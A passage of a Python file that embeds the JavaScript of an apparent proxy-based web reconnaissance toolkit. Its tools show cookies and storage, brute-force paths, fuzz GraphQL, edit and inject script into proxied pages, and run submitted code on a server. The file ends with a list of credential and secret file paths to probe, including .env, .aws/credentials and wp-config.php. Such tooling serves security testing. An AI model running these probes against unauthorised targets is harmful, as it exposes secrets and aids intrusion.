        +'word-break:break-all;color:#e2e8f0">'+escHtml(a.href.slice(0,200))+'</div>';
    }).join('') || '<div style="color:#94a3b8">No OAuth links found.</div>');
}
function toolSession(){
  var body = showModal('Session Probe','');
  var cookies = document.cookie.split(';').map(function(c){return c.trim();}).filter(Boolean);
  body.innerHTML = '<div style="color:#38bdf8;font-weight:700;margin-bottom:10px">'
    +cookies.length+' cookies visible to JS</div>'
    +cookies.map(function(c){
      var eq = c.indexOf('=');
      return '<div style="padding:10px 12px;background:#070b16;border-radius:8px;'
        +'margin-bottom:5px;font-family:ui-monospace,monospace;font-size:11.5px">'
        +'<div style="color:#38bdf8">'+escHtml(c.slice(0,eq))+'</div>'
        +'<div style="color:#94a3b8;word-break:break-all">'
        +escHtml(c.slice(eq+1).slice(0,80))+'</div></div>';
    }).join('');
}
function toolClickjacking(){
  showModal('Clickjacking Test','<div style="color:#94a3b8">Checking framing headers…</div>');
  var fd = new FormData(); fd.append('url', upstream);
  api('/tool/clickjack',{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(data){
    showModal('Clickjacking Test',
      '<div style="padding:14px;background:'+(data.framable?'rgba(248,113,113,.1)':'rgba(16,185,129,.1)')
      +';border-radius:10px;border-left:3px solid '+(data.framable?'#f87171':'#10b981')+'">'
      +'<div style="font-weight:700;color:'+(data.framable?'#f87171':'#10b981')+'">'
      +(data.framable?'Page appears framable → clickjacking risk':'Framing is blocked')+'</div></div>');
  });
}
function toolTabnabbing(){
  var body = showModal('Reverse Tabnabbing','');
  var anchors = Array.from(document.querySelectorAll('a[target="_blank"]'));
  var unsafe = anchors.filter(function(a){
    var rel = (a.getAttribute('rel')||'').toLowerCase();
    return !(rel.indexOf('noopener') !== -1 || rel.indexOf('noreferrer') !== -1);
  });
  body.innerHTML = unsafe.length
    ? '<div style="color:#f87171;font-weight:700;margin-bottom:10px">'
      +unsafe.length+' unsafe / '+anchors.length+'</div>'
      +unsafe.slice(0,30).map(function(a){
        return '<div style="padding:8px 12px;background:#070b16;border-radius:7px;'
          +'margin-bottom:4px;font-family:ui-monospace,monospace;font-size:11.5px;'
          +'word-break:break-all;border-left:3px solid #f87171">'
          +escHtml(a.href.slice(0,140))+'</div>';
      }).join('')
    : '<div style="color:#10b981;padding:16px;text-align:center">No unsafe _blank anchors.</div>';
}
function toolBrute(){
  var body = showModal('Directory Brute',
    '<textarea id="__bl" style="width:100%;height:170px;background:#070b16;color:#e2e8f0;'
    +'border:1px solid rgba(148,163,184,.2);border-radius:9px;padding:12px;'
    +'font-family:ui-monospace,monospace;font-size:12px;outline:none;resize:vertical">'
    +escHtml('admin\napi\nlogin\nbackup.zip\nconfig.json\n.env\n.git/config\nrobots.txt\nwp-admin\nphpinfo.php\nswagger.json')+'</textarea>'
    +'<button id="__rb" style="margin-top:12px;padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Probe</button>'
    +'<div id="__bo" style="margin-top:16px"></div>');
  body.querySelector('#__rb').onclick = async function(){
    var out = body.querySelector('#__bo');
    out.innerHTML = window.__LYNK_UI__.skeleton(6);
    var paths = body.querySelector('#__bl').value.split('\n').map(function(s){return s.trim();}).filter(Boolean);
    var fd = new FormData(); fd.append('url', upstream); fd.append('paths', JSON.stringify(paths));
    try {
      var r = await api('/tool/brute',{method:'POST',body:fd});
      var data = await r.json();
      var hits = (data.results||[]).filter(function(x){ return x.status && x.status !== 404 && x.status !== 0; });
      out.innerHTML = hits.length
        ? hits.map(function(x){
            return '<div style="display:flex;gap:10px;padding:8px 12px;background:#070b16;'
              +'border-radius:7px;margin-bottom:4px;font-family:ui-monospace,monospace;font-size:11.5px">'
              +'<span style="color:#10b981;font-weight:700">'+x.status+'</span>'
              +'<span style="color:#e2e8f0">'+escHtml(x.path)+'</span></div>';
          }).join('')
        : '<div style="color:#94a3b8">No interesting paths.</div>';
    } catch(e){ out.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
  };
}
function toolDirView(){ showDirViewer(upstream); }
async function toolJSEndpoints(){
  var body = showModal('JS Endpoints','<div style="color:#94a3b8">Scanning…</div>');
  var fd = new FormData(); fd.append('url', upstream);
  try {
    var r = await api('/tool/js-endpoints',{method:'POST',body:fd});
    var data = await r.json();
    var eps = data.endpoints || [];
    body.innerHTML = eps.length
      ? eps.map(function(e){
          return '<div style="padding:7px 12px;background:#070b16;border-radius:6px;'
            +'margin-bottom:3px;font-family:ui-monospace,monospace;font-size:11.5px">'
            +escHtml(e.absolute)+'</div>';
        }).join('')
      : '<div style="color:#94a3b8">No endpoints found.</div>';
  } catch(e){ body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
}
function toolSourceMap(){
  var body = showModal('Source Map Hunt','');
  var scripts = Array.from(document.querySelectorAll('script[src]')).map(function(s){return s.src;});
  body.innerHTML = '<div style="color:#38bdf8;font-weight:700;margin-bottom:10px">'
    +scripts.length+' scripts loaded</div>'
    +scripts.map(function(s){
      return '<div style="padding:6px 10px;background:#070b16;border-radius:6px;'
        +'margin-bottom:3px;font-family:ui-monospace,monospace;font-size:11px;'
        +'word-break:break-all">'+escHtml(s)+'</div>';
    }).join('');
}
function toolGraphQL(){
  var body = showModal('GraphQL Introspection',
    '<button id="__gqla" style="padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Introspect</button>'
    +'<div id="__gqlout" style="margin-top:16px"></div>');
  body.querySelector('#__gqla').onclick = async function(){
    var out = body.querySelector('#__gqlout');
    out.innerHTML = window.__LYNK_UI__.skeleton(4);
    var fd = new FormData(); fd.append('url', upstream);
    try {
      var r = await api('/tool/graphql',{method:'POST',body:fd});
      var data = await r.json();
      out.innerHTML = '<pre style="background:#070b16;padding:14px;border-radius:9px;'
        +'font-family:ui-monospace,monospace;font-size:11.5px;white-space:pre-wrap">'
        +escHtml(JSON.stringify(data,null,2))+'</pre>';
    } catch(e){ out.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
  };
}
function toolGraphQLFuzz(){
  var body = showModal('GraphQL Fuzz','<div style="color:#94a3b8">Fuzzing…</div>');
  var fd = new FormData(); fd.append('url', upstream);
  api('/tool/graphql-fuzz',{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(data){
    body.innerHTML = '<pre style="background:#070b16;padding:14px;border-radius:9px;'
      +'font-family:ui-monospace,monospace;font-size:11.5px;white-space:pre-wrap">'
      +escHtml(JSON.stringify(data,null,2))+'</pre>';
  }).catch(function(e){ body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; });
}
function toolAPIDiscover(){
  var body = showModal('API Discovery','<div style="color:#94a3b8">Probing…</div>');
  var fd = new FormData(); fd.append('url', upstream);
  api('/tool/api-discover',{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(data){
    var hits = (data.results||[]).filter(function(x){ return x.status && x.status !== 404; });
    body.innerHTML = hits.length
      ? hits.map(function(x){
          return '<div style="padding:8px 12px;background:#070b16;border-radius:7px;'
            +'margin-bottom:4px;font-family:ui-monospace,monospace;font-size:11.5px;'
            +'display:flex;gap:10px">'
            +'<span style="color:#38bdf8;width:40px">'+x.status+'</span>'
            +'<span style="color:#e2e8f0">'+escHtml(x.path)+'</span></div>';
        }).join('')
      : '<div style="color:#94a3b8">No API paths found.</div>';
  }).catch(function(e){ body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; });
}
function toolParamDiscovery(){
  var body = showModal('Parameter Discovery',
    '<button id="__pd_run" style="padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Probe</button>'
    +'<div id="__pd_out" style="margin-top:16px"></div>');
  body.querySelector('#__pd_run').onclick = async function(){
    var out = body.querySelector('#__pd_out');
    out.innerHTML = window.__LYNK_UI__.skeleton(5);
    var fd = new FormData(); fd.append('url', upstream);
    try {
      var r = await api('/tool/params',{method:'POST',body:fd});
      var data = await r.json();
      var hits = (data.results||[]).filter(function(x){ return x.reflected || x.differs; });
      out.innerHTML = hits.length
        ? hits.map(function(x){
            return '<div style="padding:10px 12px;background:#070b16;border-radius:8px;'
              +'margin-bottom:5px;border-left:3px solid #f59e0b">'
              +'<div style="font-family:ui-monospace,monospace;color:#38bdf8">'
              +escHtml(x.name)+'</div></div>';
          }).join('')
        : '<div style="color:#94a3b8">No interesting parameters.</div>';
    } catch(e){ out.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
  };
}
function toolLinks(){
  var body = showModal('Links & Forms','');
  var links = Array.from(document.querySelectorAll('a[href]')).slice(0,100);
  var forms = Array.from(document.querySelectorAll('form'));
  body.innerHTML = '<div style="color:#38bdf8;font-weight:700;margin-bottom:10px">'
    +links.length+' links · '+forms.length+' forms</div>'
    +forms.map(function(f){
      return '<div style="padding:8px 12px;background:#070b16;border-radius:7px;'
        +'margin-bottom:6px;font-family:ui-monospace,monospace;font-size:11.5px">'
        +'<span style="color:#f59e0b">'+(f.method||'GET').toUpperCase()+'</span> '
        +escHtml(f.action||'(current)')+'</div>';
    }).join('');
}
// DOM Explorer: kept brief for this reproduction
function toolDOMExplorer(){
  var body = showModal('DOM Explorer','');
  var divs = Array.from(document.querySelectorAll('div')).slice(0, 60);
  body.innerHTML = '<div style="color:#38bdf8;font-weight:700;margin-bottom:10px">'
    +divs.length+' divs (showing first 60)</div>'
    +divs.map(function(d){
      var id = d.id ? '#'+d.id : '';
      var cls = d.className && typeof d.className === 'string'
        ? '.'+d.className.trim().split(/\s+/).slice(0,2).join('.') : '';
      return '<div style="padding:6px 10px;background:#070b16;border-radius:6px;'
        +'margin-bottom:3px;font-family:ui-monospace,monospace;font-size:11.5px;'
        +'color:#38bdf8">div'+escHtml(id+cls)+'</div>';
    }).join('');
}
async function toolDiag(){
  var body = showModal('Diagnose URL','<div style="color:#94a3b8">Running…</div>');
  try {
    var r = await api('/tool/diag?url='+upEnc);
    var d = await r.json();
    body.innerHTML = '<pre style="background:#070b16;padding:16px;border-radius:10px;'
      +'font-family:ui-monospace,monospace;font-size:12px;white-space:pre-wrap">'
      +escHtml(JSON.stringify(d,null,2))+'</pre>';
  } catch(e){ body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
}
async function toolDNS(){
  var body = showModal('DNS / IP','<div style="color:#94a3b8">Resolving…</div>');
  var data = await apiJSON('/tool/dns?url='+upEnc);
  body.innerHTML = '<pre style="background:#070b16;padding:16px;border-radius:10px;'
    +'font-family:ui-monospace,monospace;font-size:12px;white-space:pre-wrap">'
    +escHtml(JSON.stringify(data,null,2))+'</pre>';
}
async function toolDNSDeep(){
  var body = showModal('DNS Deep','<div style="color:#94a3b8">Running…</div>');
  var fd = new FormData(); fd.append('url', upstream);
  try {
    var r = await api('/tool/dns-deep',{method:'POST',body:fd});
    var data = await r.json();
    body.innerHTML = '<pre style="background:#070b16;padding:16px;border-radius:10px;'
      +'font-family:ui-monospace,monospace;font-size:12px;white-space:pre-wrap">'
      +escHtml(JSON.stringify(data,null,2))+'</pre>';
  } catch(e){ body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
}
async function toolHeaders(){
  var body = showModal('Response Headers','<div style="color:#94a3b8">Fetching…</div>');
  var data = await apiJSON('/tool/headers?url='+upEnc);
  body.innerHTML = '<pre style="background:#070b16;padding:16px;border-radius:10px;'
    +'font-family:ui-monospace,monospace;font-size:12px;white-space:pre-wrap">'
    +escHtml(JSON.stringify(data,null,2))+'</pre>';
}
async function toolScan(){
  var body = showModal('Tech Fingerprint','<div style="color:#94a3b8">Scanning…</div>');
  var data = await apiJSON('/tool/scan?url='+upEnc);
  body.innerHTML = '<pre style="background:#070b16;padding:16px;border-radius:10px;'
    +'font-family:ui-monospace,monospace;font-size:12px;white-space:pre-wrap">'
    +escHtml(JSON.stringify(data,null,2))+'</pre>';
}
async function toolSource(){
  var body = showModal('Page Source','<div style="color:#94a3b8">Loading…</div>');
  var r = await api('/tool/source?url='+upEnc); var txt = await r.text();
  body.innerHTML = '<pre style="background:#070b16;padding:16px;border-radius:10px;'
    +'overflow:auto;max-height:62vh;font-family:ui-monospace,monospace;font-size:11.5px;'
    +'white-space:pre-wrap;word-break:break-word">'+escHtml(txt.slice(0,200000))+'</pre>';
}
async function toolEdit(){
  var body = showModal('Edit Source','<div style="color:#94a3b8">Loading…</div>');
  var r = await api('/tool/source?url='+upEnc); var txt = await r.text();
  body.innerHTML = '<textarea id="__edbox" style="width:100%;height:52vh;background:#070b16;'
    +'color:#e2e8f0;border:1px solid rgba(148,163,184,.2);border-radius:10px;padding:14px;'
    +'font-family:ui-monospace,monospace;font-size:11.5px;outline:none;resize:vertical">'
    +escHtml(txt)+'</textarea>'
    +'<div style="display:flex;gap:8px;margin-top:12px">'
    +'<button id="__sv" style="flex:1;padding:11px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;'
    +'font-weight:700;cursor:pointer;font-family:inherit;font-size:13px">Save & reload</button>'
    +'<button id="__rv" style="padding:11px 18px;border-radius:9px;'
    +'border:1px solid rgba(148,163,184,.3);background:transparent;color:#e2e8f0;'
    +'cursor:pointer;font-family:inherit;font-size:12px;font-weight:600">Revert</button></div>';
  body.querySelector('#__sv').onclick = async function(){
    var fd = new FormData(); fd.append('url', upstream); fd.append('html', body.querySelector('#__edbox').value);
    await api('/tool/source/save',{method:'POST',body:fd});
    location.reload();
  };
  body.querySelector('#__rv').onclick = async function(){
    var fd = new FormData(); fd.append('url', upstream);
    await api('/tool/source/clear',{method:'POST',body:fd});
    location.reload();
  };
}
async function toolInject(){
  var body = showModal('Inject JavaScript','');
  var data = await apiJSON('/tool/inject/list');
  body.innerHTML = '<div style="margin-bottom:14px;font-size:12.5px;color:#94a3b8">'
    +'Enabled snippets run in every proxied page in this session.</div>'
    +(data.snippets.length ? data.snippets.map(function(s){
      return '<div style="padding:10px 12px;background:#070b16;border-radius:8px;'
        +'margin-bottom:6px;font-size:12.5px">'+escHtml(s.name)
        +' ('+s.size+'B · '+(s.enabled?'ON':'OFF')+')</div>';
    }).join('') : '<div style="color:#64748b">No snippets yet.</div>');
}
function toolCSS(){
  var body = showModal('Live CSS',
    '<textarea id="__css" style="width:100%;height:46vh;background:#070b16;color:#e2e8f0;'
    +'border:1px solid rgba(148,163,184,.2);border-radius:10px;padding:14px;'
    +'font-family:ui-monospace,monospace;font-size:12.5px;outline:none" '
    +'placeholder="body { background: #000 !important; }"></textarea>'
    +'<button id="__app" style="margin-top:12px;padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Apply</button>');
  body.querySelector('#__app').onclick = function(){
    var el = document.getElementById('__lynk_css');
    if (!el){ el = document.createElement('style'); el.id = '__lynk_css'; document.head.appendChild(el); }
    el.textContent = body.querySelector('#__css').value;
  };
}
function toolCookies(){
  var body = showModal('Cookie Manager','');
  var cookies = document.cookie.split(';').map(function(c){return c.trim();}).filter(Boolean);
  body.innerHTML = cookies.map(function(c){
    return '<div style="padding:9px 12px;border-radius:7px;background:#070b16;'
      +'margin-bottom:6px;font-family:ui-monospace,monospace;font-size:12px;'
      +'word-break:break-all">'+escHtml(c)+'</div>';
  }).join('') || '<div style="color:#94a3b8">No cookies.</div>';
}
function toolStorage(){
  var body = showModal('Storage','');
  body.innerHTML = '<pre style="background:#070b16;padding:16px;border-radius:10px;'
    +'font-family:ui-monospace,monospace;font-size:11.5px;white-space:pre-wrap">'
    +escHtml(JSON.stringify({
      localStorage: Object.fromEntries(Object.entries(localStorage)),
      sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
    }, null, 2))+'</pre>';
}
function toolAgent(){
  var body = showModal('Run Agent',
    '<textarea id="__agentcode" placeholder="Python or JS…" '
    +'style="width:100%;height:220px;background:#070b16;color:#e2e8f0;'
    +'border:1px solid rgba(148,163,184,.2);border-radius:9px;padding:12px;'
    +'font-family:ui-monospace,monospace;font-size:12px;outline:none"></textarea>'
    +'<button id="__agentrun" style="margin-top:14px;padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Run (Python/server)</button>'
    +'<div id="__agentout" style="margin-top:14px;font-family:ui-monospace,monospace;'
    +'font-size:11.5px;color:#94a3b8"></div>');
  body.querySelector('#__agentrun').onclick = async function(){
    var code = body.querySelector('#__agentcode').value;
    var out = body.querySelector('#__agentout');
    out.textContent = 'Running…';
    var fd = new FormData(); fd.append('code', code); fd.append('url', upstream);
    try {
      var r = await api('/tool/agent-run',{method:'POST',body:fd});
      var data = await r.json();
      out.textContent = JSON.stringify(data, null, 2);
    } catch(e){ out.textContent = 'Error: '+e.message; }
  };
}
async function toolHistory(){
  var body = showModal('History','');
  var data = await apiJSON('/tool/history');
  body.innerHTML = data.entries.length ? data.entries.map(function(e){
    return '<div style="padding:10px 12px;background:#070b16;border-radius:7px;'
      +'margin-bottom:4px;font-family:ui-monospace,monospace;font-size:11.5px;'
      +'overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'
      +'<span style="color:#64748b">'+e.status+'</span> '+escHtml(e.url)+'</div>';
  }).join('') : '<div style="color:#94a3b8">No history.</div>';
}

function toolWellKnown(){
  var body = showModal('Well-Known Probe',
    '<button id="__wk_run" style="padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Probe</button>'
    +'<div id="__wk_out" style="margin-top:16px"></div>');
  body.querySelector('#__wk_run').onclick = async function(){
    var out = body.querySelector('#__wk_out');
    out.innerHTML = window.__LYNK_UI__.skeleton(5);
    var fd = new FormData(); fd.append('url', upstream);
    try {
      var r = await api('/tool/well-known',{method:'POST',body:fd});
      var data = await r.json();
      var hits = (data.results||[]).filter(function(x){ return x.status === 200; });
      out.innerHTML = hits.length
        ? hits.map(function(x){
            return '<div style="padding:8px 12px;background:#070b16;border-radius:7px;'
              +'margin-bottom:4px;font-family:ui-monospace,monospace;font-size:11.5px">'
              +escHtml(x.path)+' <span style="color:#64748b">('+x.length+'B)</span></div>';
          }).join('')
        : '<div style="color:#94a3b8">Nothing found.</div>';
    } catch(e){ out.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
  };
}

async function toolWAF(){
  var body = showModal('WAF Detect','<div style="color:#94a3b8">Probing…</div>');
  var fd = new FormData(); fd.append('url', upstream);
  try {
    var r = await api('/tool/waf',{method:'POST',body:fd});
    var data = await r.json();
    body.innerHTML = '<pre style="background:#070b16;padding:14px;border-radius:9px;'
      +'font-family:ui-monospace,monospace;font-size:11.5px;white-space:pre-wrap">'
      +escHtml(JSON.stringify(data,null,2))+'</pre>';
  } catch(e){ body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
}

async function toolWayback(){
  var body = showModal('Wayback Machine','<div style="color:#94a3b8">Fetching…</div>');
  var fd = new FormData(); fd.append('url', upstream);
  try {
    var r = await api('/tool/wayback',{method:'POST',body:fd});
    var data = await r.json();
    var s = data.snapshots || [];
    body.innerHTML = s.length
      ? s.map(function(x){
          return '<div style="padding:8px 12px;background:#070b16;border-radius:7px;'
            +'margin-bottom:4px;font-family:ui-monospace,monospace;font-size:11.5px">'
            +'<span style="color:#64748b">'+escHtml(x.timestamp)+'</span> '
            +escHtml(x.url)+'</div>';
        }).join('')
      : '<div style="color:#94a3b8">No snapshots.</div>';
  } catch(e){ body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
}

async function toolFavicon(){
  var body = showModal('Favicon Hash','<div style="color:#94a3b8">Fetching…</div>');
  var fd = new FormData(); fd.append('url', upstream);
  try {
    var r = await api('/tool/favicon',{method:'POST',body:fd});
    var data = await r.json();
    body.innerHTML = '<pre style="background:#070b16;padding:14px;border-radius:9px;'
      +'font-family:ui-monospace,monospace;font-size:11.5px;white-space:pre-wrap">'
      +escHtml(JSON.stringify(data,null,2))+'</pre>';
  } catch(e){ body.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>'; }
}

// ---------- RATE LIMIT STRESS (from PANEL_JS) ----------
function toolRateLimitStress(){
  var body = showModal('Rate-Limit Stress',
    '<div class="callout info" style="padding:12px 14px;background:rgba(56,189,248,.08);'
    +'border-left:3px solid #38bdf8;border-radius:10px;margin-bottom:14px;font-size:12px;'
    +'line-height:1.6;color:#94a3b8">'
    +'<b style="color:#38bdf8">Bounded probe.</b> Measures where the target throttles. '
    +'Hard caps: ≤20 concurrent, ≤500 total, ≤50 RPS. '
    +'Honours <code>Retry-After</code>, aborts after N consecutive 429s.</div>'
    +'<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px">'
      +'<label style="display:flex;flex-direction:column;gap:4px;font-size:11px;color:#94a3b8">'
        +'Total<input id="__rs_total" type="number" value="100" min="1" max="500" '
        +'style="padding:9px 10px;background:#070b16;color:#e2e8f0;'
        +'border:1px solid rgba(148,163,184,.2);border-radius:7px;font-size:12px"/></label>'
      +'<label style="display:flex;flex-direction:column;gap:4px;font-size:11px;color:#94a3b8">'
        +'Concurrency<input id="__rs_conc" type="number" value="5" min="1" max="20" '
        +'style="padding:9px 10px;background:#070b16;color:#e2e8f0;'
        +'border:1px solid rgba(148,163,184,.2);border-radius:7px;font-size:12px"/></label>'
      +'<label style="display:flex;flex-direction:column;gap:4px;font-size:11px;color:#94a3b8">'
        +'Max RPS<input id="__rs_rps" type="number" value="10" min="0.5" max="50" step="0.5" '
        +'style="padding:9px 10px;background:#070b16;color:#e2e8f0;'
        +'border:1px solid rgba(148,163,184,.2);border-radius:7px;font-size:12px"/></label>'
      +'<label style="display:flex;flex-direction:column;gap:4px;font-size:11px;color:#94a3b8">'
        +'Abort after N×429<input id="__rs_abort" type="number" value="5" min="1" max="50" '
        +'style="padding:9px 10px;background:#070b16;color:#e2e8f0;'
        +'border:1px solid rgba(148,163,184,.2);border-radius:7px;font-size:12px"/></label>'
    +'</div>'
    +'<button id="__rs_run" style="padding:11px 24px;border-radius:9px;border:none;'
    +'background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;font-weight:700;'
    +'cursor:pointer;font-family:inherit;font-size:13px">Run bounded probe</button>'
    +'<div id="__rs_out" style="margin-top:16px"></div>');
  body.querySelector('#__rs_run').onclick = async function(){
    var out = body.querySelector('#__rs_out');
    out.innerHTML = window.__LYNK_UI__.skeleton(6);
    var fd = new FormData();
    fd.append('url', upstream);
    fd.append('total', body.querySelector('#__rs_total').value);
    fd.append('concurrency', body.querySelector('#__rs_conc').value);
    fd.append('rps', body.querySelector('#__rs_rps').value);
    fd.append('abort_after', body.querySelector('#__rs_abort').value);
    fd.append('timeout_s', '8');
    var btn = body.querySelector('#__rs_run');
    try {
      var r = await window.__LYNK_UI__.withLoader(btn, api('/tool/ratelimit-stress',{method:'POST',body:fd}));
      var d = await r.json();
      if (d.error){ out.innerHTML='<div style="color:#f87171">'+escHtml(d.error)+'</div>'; return; }
      var statusRows = Object.keys(d.status_counts).map(function(k){
        return '<div style="display:flex;gap:10px;padding:8px 12px;background:#070b16;'
          +'border-radius:7px;margin-bottom:4px;font-family:ui-monospace,monospace;'
          +'font-size:11.5px"><span style="color:#38bdf8;width:60px">HTTP '+k+'</span>'
          +'<span style="color:#e2e8f0">'+d.status_counts[k]+'</span></div>';
      }).join('');
      out.innerHTML = '<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:14px">'
        +'<div style="padding:10px 16px;background:#070b16;border-radius:9px;text-align:center">'
        +'<div style="font-size:20px;font-weight:800;color:#38bdf8">'+d.sent+'</div>'
        +'<div style="font-size:10.5px;color:#64748b;text-transform:uppercase">sent</div></div>'
        +'<div style="padding:10px 16px;background:#070b16;border-radius:9px;text-align:center">'
        +'<div style="font-size:20px;font-weight:800;color:#10b981">'+d.p50+'ms</div>'
        +'<div style="font-size:10.5px;color:#64748b;text-transform:uppercase">p50</div></div>'
        +'<div style="padding:10px 16px;background:#070b16;border-radius:9px;text-align:center">'
        +'<div style="font-size:20px;font-weight:800;color:#f59e0b">'+d.p95+'ms</div>'
        +'<div style="font-size:10.5px;color:#64748b;text-transform:uppercase">p95</div></div>'
        +'<div style="padding:10px 16px;background:#070b16;border-radius:9px;text-align:center">'
        +'<div style="font-size:20px;font-weight:800;color:#f87171">'+d.p99+'ms</div>'
        +'<div style="font-size:10.5px;color:#64748b;text-transform:uppercase">p99</div></div>'
        +'</div>'
        +'<div style="font-weight:700;color:#38bdf8;margin-bottom:6px">Status distribution</div>'
        + statusRows
        + (d.throttled
            ? '<div style="padding:14px;background:rgba(248,113,113,.1);border-radius:9px;'
              +'border-left:3px solid #f87171;margin-top:12px">'
              +'<div style="font-weight:700;color:#f87171">Throttled at request #'
              +d.first_429_at+'</div>'
              +(d.retry_after?'<div style="color:#94a3b8;font-size:12px;margin-top:4px">'
                +'Retry-After: '+escHtml(d.retry_after)+'</div>':'')+'</div>'
            : '<div style="padding:14px;background:rgba(16,185,129,.1);border-radius:9px;'
              +'border-left:3px solid #10b981;margin-top:12px;color:#10b981;font-weight:600">'
              +'No throttling observed in this window.</div>')
        +(d.hint?'<div style="padding:12px;background:rgba(245,158,11,.1);border-radius:9px;'
          +'border-left:3px solid #f59e0b;margin-top:10px;color:#f59e0b;font-size:12px">'
          +escHtml(d.hint)+'</div>':'');
    } catch(e){
      out.innerHTML = '<div style="color:#f87171">'+escHtml(e.message)+'</div>';
    }
  };
}

window.__LYNK_ENGINES__ = {};
})();
"""


# ======================================================================
# TABBAR_JS — no-op stub (the tabs shell handles its own tab bar)
# ======================================================================
TABBAR_JS = r"""
(function(){
if(window.__LYNK_SHELL__) return;
window.__LYNK_SHELL__ = true;
// The multi-tab shell at /tabs provides its own tab bar; proxied pages
// don't need an additional one. This file exists so /tool/tabbar.js
// doesn't 404 in pages that reference it.
})();
"""


# ======================================================================
# SERVICE_WORKER_JS
# ======================================================================
SERVICE_WORKER_JS = r"""const PASSTHROUGH = /^\/(__lynk_|tool\/|search|proxy|favicon|healthz|tabs)/;
self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  if (url.origin !== location.origin) return;
  if (PASSTHROUGH.test(url.pathname)) return;
  if (event.request.mode === 'navigate') return;
  const wrapped = new URL('/proxy', location.origin);
  wrapped.searchParams.set('url', url.toString());
  event.respondWith(fetch(wrapped.toString(), {
    method: event.request.method, headers: event.request.headers,
    body: (event.request.method === 'GET' || event.request.method === 'HEAD')
      ? undefined : event.request.clone().body,
    credentials: 'same-origin', redirect: 'follow',
  }).catch(() => fetch(event.request)));
});
"""


# ======================================================================
# Scanner data
# ======================================================================
SECURITY_HEADERS = {
    "strict-transport-security": ("medium","Missing HSTS","Downgrade to HTTP is possible.",
        "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"),
    "content-security-policy": ("high","Missing CSP","XSS impact unmitigated.",
        "Add a strict CSP with script-src 'self'."),
    "x-frame-options": ("medium","Missing X-Frame-Options","Clickjacking risk.",
        "Add X-Frame-Options: DENY or CSP frame-ancestors."),
    "x-content-type-options": ("low","Missing X-Content-Type-Options","MIME sniffing possible.",
        "Add X-Content-Type-Options: nosniff"),
    "referrer-policy": ("low","Missing Referrer-Policy","URL leaks to third parties.",
        "Add Referrer-Policy: strict-origin-when-cross-origin"),
    "permissions-policy": ("low","Missing Permissions-Policy","Browser features unrestricted.",
        "Add Permissions-Policy."),
    "cross-origin-opener-policy": ("low","Missing COOP","Popup isolation weakened.",
        "Add Cross-Origin-Opener-Policy: same-origin"),
    "cross-origin-embedder-policy": ("low","Missing COEP","COEP not set.",
        "Add Cross-Origin-Embedder-Policy: require-corp"),
    "cross-origin-resource-policy": ("low","Missing CORP","CORP not set.",
        "Add Cross-Origin-Resource-Policy: same-origin"),
    "x-powered-by": ("low","X-Powered-By leaks framework","Reveals backend.",
        "Strip in reverse proxy or disable in framework."),
    "x-aspnet-version": ("medium","ASP.NET version exposed","Reveals exact version.",
        'Set enableVersionHeader="false".'),
}

SENSITIVE_PATHS = [
    ("/.env","Env file","critical"),("/.env.local","Env file","critical"),
    ("/.env.production","Env file (prod)","critical"),
    ("/.git/config","Git config","high"),("/.git/HEAD","Git HEAD","high"),
    ("/.git/index","Git index","high"),
    ("/.svn/entries","SVN entries","high"),
    ("/web.config","IIS config","critical"),
    ("/wp-config.php","WP config","critical"),
    ("/wp-config.php.bak","WP config backup","critical"),
    ("/configuration.php","Joomla config","critical"),
    ("/config.php","PHP config","critical"),
    ("/config.json","JSON config","high"),
    ("/config.yml","YAML config","high"),
    ("/settings.py","Python settings","high"),
    ("/settings.php","PHP settings","high"),
    ("/appsettings.json","ASP.NET settings","high"),
    ("/.aws/credentials","AWS credentials","critical"),
    ("/.docker/config.json","Docker config","high"),
    ("/docker-compose.yml","docker-compose","high"),
    ("/Jenkinsfile","Jenkinsfile","medium"),
    ("/.gitlab-ci.yml","GitLab CI","medium"),
    ("/composer.json","Composer","low"),
    ("/package.json","package.json","low"),
    ("/requirements.txt","Python requirements","low"),
